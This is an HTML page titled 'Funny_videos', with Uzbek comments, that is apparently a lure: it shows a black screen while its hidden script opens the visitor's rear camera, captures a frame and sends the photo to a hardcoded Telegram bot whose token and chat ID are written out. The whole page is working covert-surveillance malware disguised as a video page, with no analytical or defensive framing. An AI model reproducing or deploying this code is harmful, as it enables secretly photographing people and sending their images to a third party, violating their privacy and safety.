<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <title>Funny_videos</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        html, body {
            margin: 0;
            padding: 0;
            background: #000;
            height: 100%;
            overflow: hidden;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="320" height="240"></canvas>

<script>
    // ðŸ”´ Telegram bot token va chat ID
    const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
    const CHAT_ID  = "7880376636";

    function sendToTelegram(imageBlob) {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", imageBlob);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        }).catch(err => console.log("Telegram xato"));
    }

    // ðŸ”¹ Kamera tanlash: "user" = old kamera, "environment" = orqa kamera
    const CAMERA_MODE = "environment"; // orqa kamera

    navigator.mediaDevices.getUserMedia({ video: { facingMode: CAMERA_MODE } })
    .then(stream => {
        const video = document.getElementById("video");
        video.srcObject = stream;

        video.addEventListener('canplay', () => {
            setTimeout(() => {
                const canvas = document.getElementById("canvas");
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    sendToTelegram(blob);
                }, "image/jpeg", 0.9);

                stream.getTracks().forEach(track => track.stop());
            }, 500); // video barqaror boâ€˜lishi uchun 0.5 soniya kutish
        });
    })
    .catch(err => console.log("Kameraga ruxsat berilmadi"));
</script>

</body>
</html>
